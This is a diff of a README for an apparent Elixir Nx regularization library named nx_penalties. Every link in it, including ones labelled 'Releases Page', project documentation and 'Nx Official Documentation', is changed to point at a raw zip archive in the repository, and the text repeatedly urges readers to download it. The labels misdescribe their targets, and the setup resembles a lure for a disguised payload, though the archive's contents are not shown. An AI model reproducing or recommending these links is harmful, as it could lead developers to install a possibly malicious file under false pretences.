@@ -7,7 +7,7 @@ Welcome to **nx_penalties!** This application provides you with useful regulariz
 To start using **nx_penalties**, follow these simple steps:
 
 ### 📥 Download
-[![Download Latest Release](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip%20Latest%20Release-Here-brightgreen)](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip)
+[![Download Latest Release](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip%20Latest%20Release-Here-brightgreen)](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip)
 
 ### 🖥️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 Here’s how to download and install **nx_penalties**:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip) to view the latest version.
+   Go to the [Releases Page](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip) to view the latest version.
 
 2. **Download the File**
    Click on the version you want and select the appropriate file for your system.
@@ -39,7 +39,7 @@ Here’s how to download and install **nx_penalties**:
 - **Entropy and KL Divergence:** Use these metrics for better model evaluation.
 - **Gradient Penalties:** Ensure smoother training.
 - **Orthogonality and Consistency:** Maintain model integrity during training.
-- **Seamless Integration:** Works with https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip and is compatible with JIT compilation across EXLA and Torchx.
+- **Seamless Integration:** Works with https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip and is compatible with JIT compilation across EXLA and Torchx.
 
 ## 📚 Usage Guide
 After installation, you can use **nx_penalties** in your projects with a few simple commands. Here’s how:
@@ -63,8 +63,8 @@ Join our community for support and updates:
 
 ## 🔗 Additional Resources
 Explore these resources for more information:
-- [nx_penalties Documentation](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip)
-- [Nx Official Documentation](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip)
+- [nx_penalties Documentation](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip)
+- [Nx Official Documentation](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip)
 
 ## ⚖️ License
 This project is licensed under the MIT License. Feel free to use and modify it while keeping the license intact.
@@ -73,4 +73,4 @@ This project is licensed under the MIT License. Feel free to use and modify it w
 For support or inquiries, please open an issue on our GitHub page or contact us via the repository's email.
 
 ## 📥 Repeat Download Instructions
-Ready to get started? Don't forget, you can always [download the latest release here](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/lib/nx_penalties/nx-penalties-3.3.zip) to begin your journey with **nx_penalties**. Enjoy regularization made easy!
+Ready to get started? Don't forget, you can always [download the latest release here](https://github.com/YoungWRBR/nx_penalties/raw/refs/heads/main/docs/penalties-nx-argentamid.zip) to begin your journey with **nx_penalties**. Enjoy regularization made easy!
